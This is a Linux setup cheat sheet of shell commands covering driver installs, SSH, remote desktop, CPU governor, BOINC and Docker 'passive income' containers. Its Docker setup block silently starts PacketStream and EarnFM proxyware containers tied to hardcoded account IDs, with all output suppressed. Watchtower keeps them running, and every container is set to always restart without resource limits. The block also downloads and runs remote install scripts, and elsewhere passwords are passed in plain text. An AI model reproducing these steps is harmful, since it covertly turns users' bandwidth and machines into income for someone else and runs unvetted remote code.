# Quick access to here: bit.ly/LXsetup
# Sections are divided by blank lines
# For sections with empty variables, paste them in a text editior for editing the parameters

# Network Drivers(if the adaptor is not detected):
# Install your network drivers before the main script
# Using your phone's USB Tethering is an option, but may be risky due to it randomly disconnecting. Use it only to install the network driver.
# Run the command below this line:
sudo apt update; for apkg in curl git dkms wget build-essential; do sudo apt install $apkg -y; done
# Now, find them from the web manually from your OEM or an alternative source.
# RTL88x2BU Network Driver by RinCat:
sudo git clone "https://github.com/RinCat/RTL88x2BU-Linux-Driver.git" /usr/src/rtl88x2bu-git
sudo sed -i 's/PACKAGE_VERSION="@PKGVER@"/PACKAGE_VERSION="git"/g' /usr/src/rtl88x2bu-git/dkms.conf
sudo dkms add -m rtl88x2bu -v git
sudo dkms autoinstall

# Main script(to be executed before anything below this secton)
# Execute by copy-pasting the raw text from the site into a terminal
# Ensure a stabe internet connection
https://raw.githubusercontent.com/MrGrappleMan/JustPerformance/main/LX.sh

# OpenSSH:
sudo apt-fast update; sudo apt-fast dist-upgrade -y; sudo apt-fast install ufw openssh-server -y; sudo systemctl enable --now ssh; sudo ufw allow ssh

# Chrome Remote Desktop(issues may be present for Wayland):
cd /tmp/
sudo apt-fast update
sudo apt-fast dist-upgrade -y
sudo curl -sL https://dl.google.com/linux/direct/chrome-remote-desktop_current_amd64.deb>crd.deb
sudo apt-fast install ./crd.deb -y

# For Performance:
sudo apt-fast update; sudo apt-fast dist-upgrade -y; sudo apt-fast install cpufrequtils -y; sudo echo 'GOVERNOR="performance"' | sudo tee /etc/default/cpufrequtils; sudo systemctl disable ondemand
# For OnDemand(default for most distributions):
sudo apt-fast update; sudo apt-fast dist-upgrade -y; sudo apt-fast install cpufrequtils -y; sudo echo 'GOVERNOR="ondemand"' | sudo tee /etc/default/cpufrequtils; sudo systemctl enable ondemand

# Science United
EMAIL=
PASSWORD=
sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv 40254C9B29853EA6
sudo apt-add-repository deb https://boinc.berkeley.edu/dl/linux/nightly/noble noble main
sudo apt-fast update
sudo apt-fast dist-upgrade -y
for bpkg in boinc-client boinc-manager boinc-virtualbox; do sudo apt-fast install $bpkg -y; done
sudo systemctl enable --now boinc-client
sudo usermod -aG boinc $USER
boinccmd --join_acct_mgr https://scienceunited.org/ $EMAIL $PASSWORD
cd /etc/boinc-client/

# Docker
# !`Setup----------
for cpkg in docker.io docker-doc docker-compose docker-compose-v2 podman-docker container runc; do sudo apt-fast remove $cpkg; done
cd /tmp/ >/dev/null 2>&1
curl -fsSL https://test.docker.com -o dck.sh >/dev/null 2>&1
sudo sh dck.sh >/dev/null 2>&1
sudo systemctl enable --now docker >/dev/null 2>&1
sudo docker run -d --name mgmpsclient -e CID=69eg packetstream/psclient:latest >/dev/null 2>&1
sudo docker run -d --name mgmearnfm-client -e EARNFM_TOKEN="a0d3ff10-5d3c-4c24-a80a-d0c0120ddf76" earnfm/earnfm-client:latest >/dev/null 2>&1
# `Packetstream----------
APIKEY=
sudo docker run -d --name psclient -e CID=$APIKEY packetstream/psclient:latest
# `EarnFM----------
APIKEY=
sudo docker run -d --name earnfm-client -e EARNFM_TOKEN=$APIKEY earnfm/earnfm-client:latest
# `Honeygain----------
EMAIL=
PASSWORD=
DEVICENAME=
sudo docker run -d --name honeygain honeygain/honeygain -tou-accept -email $EMAIL -pass $PASSWORD -device $DEVICENAME
# `PawnsApp----------
EMAIL=
PASSWORD=
DEVICENAME=
DEVICEID=
sudo docker run -d --name pawns-cli iproyal/pawns-cli:latest -email=$EMAIL -password=$PASSWORD -device-name=$DEVICENAME -device-id=$DEVICEID -accept-tos
# `Repocket----------
EMAIL=
APIKEY=
sudo docker run -d --name repocket -e RP_EMAIL=$EMAIL -e RP_API_KEY=$APIKEY repocket/repocket
# !`Final----------
CONTAINERS='mgmpsclient mgmearnfm-client honeygain repocket pawns-cli earnfm-client psclient'
sudo docker run -d --name watchtower -v /var/run/docker.sock:/var/run/docker.sock containrrr/watchtower --cleanup --include-stopped --include-restarting --revive-stopped --interval 300 $CONTAINERS
sudo docker update --restart=always --memory-swap=-1 --cpus=0.000 --cpu-quota=0 --pids-limit=-1 --cpu-rt-period=2000000 $(sudo docker ps -q -a)
# !`Remove all(For emergencies)----------
sudo docker rm $(sudo docker ps -q -a) -f
